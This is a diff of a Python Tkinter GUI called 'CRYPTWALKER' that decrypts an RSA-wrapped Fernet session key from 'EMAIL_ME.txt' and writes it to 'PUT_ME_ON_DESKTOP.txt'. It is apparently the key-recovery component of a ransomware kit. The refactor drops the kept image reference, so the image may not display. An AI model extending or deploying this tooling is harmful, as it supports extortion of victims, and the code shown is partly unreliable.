@@ -4,7 +4,6 @@ from tkinter import *
 
 from Crypto.Cipher import PKCS1_OAEP
 from Crypto.PublicKey import RSA
-from Crypto.Random import get_random_bytes
 from PIL import Image, ImageTk
 
 
@@ -20,7 +19,7 @@ class App(tk.Tk):
         self.iconbitmap("crypt.ico")
 
         # UI options
-        entry_font = {"font": ("Helvetica", 13)}
+        # entry_font = {"font": ("Helvetica", 13)}
 
         # configure the grid
         self.columnconfigure(0, weight=1)
@@ -33,10 +32,12 @@ class App(tk.Tk):
         winsound.PlaySound("song.wav", winsound.SND_ALIAS | winsound.SND_ASYNC | winsound.SND_LOOP)
 
         # Imports our image in
-        load = Image.open("image.jpg")
-        render = ImageTk.PhotoImage(load)
-        img = Label(self, image=render, borderwidth=0, highlightthickness=0)
-        img.image = render
+        img = Label(
+            self,
+            image=ImageTk.PhotoImage(Image.open("image.jpg")),
+            borderwidth=0,
+            highlightthickness=0,
+        )
         img.grid(column=0, row=0, sticky=tk.N)
 
         # heading
@@ -84,9 +85,8 @@ class App(tk.Tk):
                 private_crypter = PKCS1_OAEP.new(private_key)
 
                 # Decrypted session key
-                dec_fernet_key = private_crypter.decrypt(enc_fernet_key)
                 with open("PUT_ME_ON_DESKTOP.txt", "wb") as f:
-                    f.write(dec_fernet_key)
+                    f.write(private_crypter.decrypt(enc_fernet_key))
             """
             print(f'> Private key: {private_key}')
             print(f'> Private decrypter: {private_crypter}')
@@ -102,8 +102,6 @@ class App(tk.Tk):
                 text="[!!!] CRYPTWALKER >> File 'EMAIL_ME.txt' was not found",
             )
             gen2_label.grid(column=0, row=5, sticky=tk.W)
-        finally:
-            f.close()
 
         gen2_label = tk.Label(
             self,
@@ -123,6 +121,7 @@ class App(tk.Tk):
 def main():
     app = App()
     app.mainloop()
+
 
 if __name__ == "__main__":
     main()
